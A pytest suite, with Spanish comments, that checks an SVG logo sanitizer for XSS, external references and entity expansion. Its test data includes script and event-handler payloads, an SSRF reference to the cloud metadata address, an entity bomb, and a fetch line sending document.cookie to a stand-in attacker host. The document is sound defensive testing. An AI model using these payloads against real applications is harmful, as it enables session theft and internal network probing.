"""MCS SEG-01 · ASVS 5.2.7 — el SVG que sube un inquilino se sanea.

«Verify that the application sanitizes, disables, or sandboxes user-supplied
Scalable Vector Graphics (SVG) scriptable content, especially as they relate to
XSS resulting from inline scripts, and foreignObject.»

## Por qué esta suite existe aunque hoy no explote

El logo se pinta en `<img src="data:…">` —donde el navegador desactiva el
guion— y el endpoint que lo serviría como documento sale con
`Content-Security-Policy: default-src 'none'`. Dos capas, y ninguna puesta para
esto: son **circunstanciales**. El día que alguien incruste el logo como `<svg>`
para recolorearlo con CSS en tema oscuro, o excluya `/branding` de la CSP como
ya se excluyó `/docs`, el guion se ejecuta y nada avisa.

Lo que estas pruebas fijan es el saneado, que es lo único que no depende de
dónde se pinte después.

§1 — lo ejecutable se va. §2 — las referencias externas se rechazan, que es el
daño que **ya** existe hoy: WeasyPrint las pide desde dentro de la red de
Railway cada vez que se exporta un PDF. §3 — un logotipo normal sigue subiendo
y sigue siendo el mismo, que es lo que impide que la defensa se quite en dos
semanas.
"""
from __future__ import annotations

import pytest

from app.services.svg_seguro import SvgInseguroError, sanea

# ---------------------------------------------------------------------------
# §1 — Lo ejecutable no sobrevive
# ---------------------------------------------------------------------------

EJECUTABLES = [
    (
        "script inline",
        b'<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script>'
        b'<rect width="10" height="10"/></svg>',
        b"script",
    ),
    (
        "foreignObject con HTML",
        b'<svg xmlns="http://www.w3.org/2000/svg"><foreignObject>'
        b'<body xmlns="http://www.w3.org/1999/xhtml">'
        b'<img src="x" onerror="alert(1)"/></body></foreignObject></svg>',
        b"foreignObject",
    ),
    (
        "manejador onload en la raíz",
        b'<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)">'
        b'<rect width="10" height="10"/></svg>',
        b"onload",
    ),
    (
        "manejador onclick en un hijo",
        b'<svg xmlns="http://www.w3.org/2000/svg">'
        b'<rect width="10" height="10" onclick="alert(1)"/></svg>',
        b"onclick",
    ),
    (
        "animate hacia un atributo ejecutable",
        b'<svg xmlns="http://www.w3.org/2000/svg"><rect width="10" height="10">'
        b'<set attributeName="onmouseover" to="alert(1)"/></rect></svg>',
        b"onmouseover",
    ),
    (
        "handler de SVG 1.2",
        b'<svg xmlns="http://www.w3.org/2000/svg">'
        b'<handler type="text/ecmascript">alert(1)</handler></svg>',
        b"handler",
    ),
]


@pytest.mark.parametrize("nombre,entrada,prohibido", EJECUTABLES, ids=[c[0] for c in EJECUTABLES])
def test_asvs527_lo_ejecutable_no_sobrevive(nombre, entrada, prohibido):
    salida, quitado = sanea(entrada)
    assert prohibido.lower() not in salida.lower(), (
        f"«{nombre}» sobrevivió al saneado: {salida[:200]!r}"
    )
    assert quitado, "Si se quitó algo, tiene que quedar registrado"


def test_asvs527_la_lista_es_blanca_y_no_negra():
    """Un elemento que nadie previó tampoco pasa.

    Es la diferencia que decide el diseño: una lista negra se queda corta con el
    primero que no está en ella, y SVG tiene demasiados elementos para acertar
    por exclusión.
    """
    entrada = (
        b'<svg xmlns="http://www.w3.org/2000/svg">'
        b"<elementoQueNoExisteTodavia/><rect width=\"10\" height=\"10\"/></svg>"
    )
    salida, quitado = sanea(entrada)
    assert b"elementoQueNoExisteTodavia" not in salida
    assert b"rect" in salida, "Y lo que sí dibuja se queda"


# ---------------------------------------------------------------------------
# §2 — Las referencias salen del documento: se rechaza, no se mutila
# ---------------------------------------------------------------------------

EXTERNAS = [
    (
        "image href externo",
        b'<svg xmlns="http://www.w3.org/2000/svg">'
        b'<image href="https://atacante.example/pixel.png"/></svg>',
    ),
    (
        "xlink:href externo",
        b'<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">'
        b'<use xlink:href="https://atacante.example/x.svg#a"/></svg>',
    ),
    (
        "use hacia la red interna",
        b'<svg xmlns="http://www.w3.org/2000/svg">'
        b'<image href="http://169.254.169.254/latest/meta-data/"/></svg>',
    ),
    (
        "@import en el style",
        b'<svg xmlns="http://www.w3.org/2000/svg">'
        b'<style>@import url("https://atacante.example/x.css");</style></svg>',
    ),
    (
        "url() externo en el style",
        b'<svg xmlns="http://www.w3.org/2000/svg">'
        b'<style>.a{fill:url("https://atacante.example/x.svg#g")}</style></svg>',
    ),
    (
        "javascript: en un atributo style",
        b'<svg xmlns="http://www.w3.org/2000/svg">'
        b'<rect style="behavior:url(javascript:alert(1))" width="1" height="1"/></svg>',
    ),
]


@pytest.mark.parametrize("nombre,entrada", EXTERNAS, ids=[c[0] for c in EXTERNAS])
def test_asvs527_las_referencias_externas_se_rechazan(nombre, entrada):
    """Se rechaza y no se limpia en silencio: quitar la referencia devolvería un
    logotipo distinto del que la persona eligió, y es mejor decírselo.

    Y es el daño que ya existe: WeasyPrint pide esas URL desde dentro de la red
    de Railway al exportar un PDF, una vez por exportación.
    """
    with pytest.raises(SvgInseguroError):
        sanea(entrada)


def test_asvs527_las_referencias_al_propio_documento_se_conservan():
    """`#gradiente` es como funciona cualquier logotipo con degradado."""
    entrada = (
        b'<svg xmlns="http://www.w3.org/2000/svg">'
        b'<defs><linearGradient id="g"><stop offset="0" stop-color="#fff"/>'
        b"</linearGradient></defs>"
        b'<rect width="10" height="10" fill="url(#g)"/></svg>'
    )
    salida, _ = sanea(entrada)
    assert b'id="g"' in salida
    assert b"url(#g)" in salida


# ---------------------------------------------------------------------------
# §3 — Un logotipo normal sigue subiendo, y sigue siendo el mismo
# ---------------------------------------------------------------------------


def test_asvs527_un_logo_de_verdad_sobrevive_entero():
    """Sin esto la defensa se quita en dos semanas, porque rompe el producto.

    Se usa un SVG con lo que trae uno exportado de Figma o Illustrator: grupos,
    transformaciones, `<style>` con clases, degradado, trazado y texto.
    """
    entrada = (
        b'<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 40" width="100" height="40">'
        b'<style>.marca{fill:#182e4e}.acento{fill:url(#g)}</style>'
        b'<defs><linearGradient id="g" x1="0" y1="0" x2="1" y2="1">'
        b'<stop offset="0" stop-color="#182e4e"/><stop offset="1" stop-color="#4a7fb5"/>'
        b"</linearGradient></defs>"
        b'<g transform="translate(4 4)" opacity="0.95">'
        b'<path class="marca" d="M0 0 L10 0 L10 10 Z" stroke-width="1.5" stroke-linejoin="round"/>'
        b'<circle class="acento" cx="20" cy="5" r="4"/>'
        b'<text x="30" y="10" font-family="DM Sans" font-size="12" text-anchor="start">PMO</text>'
        b"</g></svg>"
    )
    salida, quitado = sanea(entrada)

    assert not quitado, f"No debería quitar nada de un logotipo legítimo: {quitado}"
    for imprescindible in (
        b"viewBox", b"linearGradient", b"stop-color", b"transform",
        b"M0 0 L10 0 L10 10 Z", b"circle", b"PMO", b"font-family",
        b"stroke-linejoin", b"opacity",
    ):
        assert imprescindible in salida, f"Se perdió {imprescindible!r} del logotipo"


def test_asvs527_lo_que_no_es_svg_se_rechaza():
    with pytest.raises(SvgInseguroError):
        sanea(b"esto no es xml")
    with pytest.raises(SvgInseguroError):
        sanea(b"<html><body>hola</body></html>")


def test_asvs527_la_bomba_de_entidades_no_pasa():
    """`defusedxml` ya lo cubría en el importador de MS Project; aquí se fija
    que el saneador use el mismo analizador y no `xml.etree` a secas."""
    bomba = (
        b'<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY a "aaaaaaaaaa">'
        b'<!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;">]>'
        b'<svg xmlns="http://www.w3.org/2000/svg"><title>&b;</title></svg>'
    )
    with pytest.raises(SvgInseguroError):
        sanea(bomba)


# ---------------------------------------------------------------------------
# §4 — De punta a punta por el endpoint que lo recibe
# ---------------------------------------------------------------------------


@pytest.mark.asyncio
async def test_asvs527_el_endpoint_guarda_el_svg_ya_saneado(client, db_session):
    """Lo que acaba en `tenant.logo_url` no puede traer el guion.

    Es la comprobación que importa: §1 prueba el saneador, esto prueba que la
    ruta de subida lo **usa**.
    """
    import base64

    from tests.factories import create_admin_role, create_tenant, create_user, login

    tenant = await create_tenant(db_session, slug="svg", name="SVG")
    rol = await create_admin_role(db_session, tenant)
    await create_user(
        db_session, tenant=tenant, username="svgadmin",
        email="svg@acme.example.com", password="Zx9-Correcta-Larga!", roles=[rol],
    )
    sesion = await login(client, "svg@acme.example.com", "Zx9-Correcta-Larga!")

    malicioso = (
        b'<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)">'
        b"<script>fetch('https://atacante.example/'+document.cookie)</script>"
        b'<rect width="10" height="10" fill="#182e4e"/></svg>'
    )
    r = await client.post(
        "/api/v1/admin/tenant/logo",
        files={"file": ("logo.svg", malicioso, "image/svg+xml")},
        headers=sesion["_authz"],
    )
    assert r.status_code == 200, r.text

    data_url = r.json()["logo_url"]
    assert data_url.startswith("data:image/svg+xml;base64,")
    guardado = base64.b64decode(data_url.split(",", 1)[1])
    assert b"script" not in guardado.lower()
    assert b"onload" not in guardado.lower()
    assert b"atacante" not in guardado
    # Y lo que dibujaba sigue ahí.
    assert b"rect" in guardado


@pytest.mark.asyncio
async def test_asvs527_el_endpoint_explica_por_que_rechaza(client, db_session):
    """Un 400 sin motivo obliga a adivinar qué tiene mal el archivo."""
    from tests.factories import create_admin_role, create_tenant, create_user, login

    tenant = await create_tenant(db_session, slug="svg2", name="SVG2")
    rol = await create_admin_role(db_session, tenant)
    await create_user(
        db_session, tenant=tenant, username="svgadmin2",
        email="svg2@acme.example.com", password="Zx9-Correcta-Larga!", roles=[rol],
    )
    sesion = await login(client, "svg2@acme.example.com", "Zx9-Correcta-Larga!")

    externo = (
        b'<svg xmlns="http://www.w3.org/2000/svg">'
        b'<image href="https://atacante.example/pixel.png"/></svg>'
    )
    r = await client.post(
        "/api/v1/admin/tenant/logo",
        files={"file": ("logo.svg", externo, "image/svg+xml")},
        headers=sesion["_authz"],
    )
    assert r.status_code == 400, r.text
    cuerpo = r.json()["detail"]
    assert "motivo" in cuerpo["fields"]
    # Las tres partes de LEN-02: qué, por qué y qué hacer.
    assert "PNG" in cuerpo["detail"], "Tiene que decir qué hacer en su lugar"
